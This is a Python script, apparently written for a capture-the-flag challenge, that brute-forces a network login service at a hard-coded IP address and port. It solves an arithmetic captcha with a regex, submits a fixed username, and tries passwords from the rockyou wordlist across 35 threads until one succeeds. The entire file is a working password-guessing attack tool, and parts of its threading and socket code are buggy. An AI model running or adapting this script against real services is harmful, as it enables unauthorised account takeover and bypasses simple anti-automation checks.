import socket
import re
import operator
import threading


host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

username = "ejnorman84"
regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
pw_find = False

def create_threads(t, passwords):
	n = len(passwords)
	x = n // t
	m = n % t
	xs = [passwords[i:i+x] for i in range(0, n, x)]
	if m:
		xs[t-1:] = [passwords[-m-x:]]
	assert(sum([len(l) for l in xs]) == n)
	return [
		threading.Thread(target=run_brute_force, args=(l)) for l in xs
	]

def run_brute_force(*passwords):
	global pw_find

	for pw in passwords:
		if pw_find:
			break
		else:
			if brute_force(pw.rstrip()):
				pw_find = True

def brute_force(pw):

	print(" Trying Passowrd: " + pw)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	d1 = str(s.recv(1024))

	while re.search(regex,d1) == None:
		d1 = s.recv(1024)

	# print("======data=====")
	# print("|"+d1+"|")
	# print("======end=====")

	m = re.search(regex,d1)
	firstNum = int(m.group('firstNum'))
	secNum = int(m.group('secNum'))
	op = m.group('op')
	res = str(ops[op](firstNum,secNum))
	# print("answr is " + res)
	s.send(res+"\n")
	d2 = s.recv(1024)
	while d2 == "\n":
		d2 = s.recv(1024)
	# print("d2 is " + d2)

	s.send(username + "\n")
	d3 = s.recv(1024)
	while d3 == "\n":
		d3 = s.recv(1024)
	# print("d3 is " + d3)

	s.send(pw + "\n")
	d4 = s.recv(1024)
	while d4 == "\n":
		d4 = s.recv(1024)

	# print("d4 result is " + d4)
	s.close()
	# print("++++s closed++++")
	if not "Fail" in d4:
		print("====================")
		print("SUCCESS")
		print("PASSWORD: " + pw)
		print("====================")
		return True
	else:
		return False


if __name__ == '__main__':
	file = open(wordlist,"r")
	passwords = file.readlines()

	thread_list = create_threads(35,passwords)

	for thread in thread_list:
		print('[*] Running thread: {}.'.format(thread.getName()))
		thread.start()

	for thread in thread_list:
		print('[*] Wating for {} to join.'.format(thread.getName()))
		thread.join()
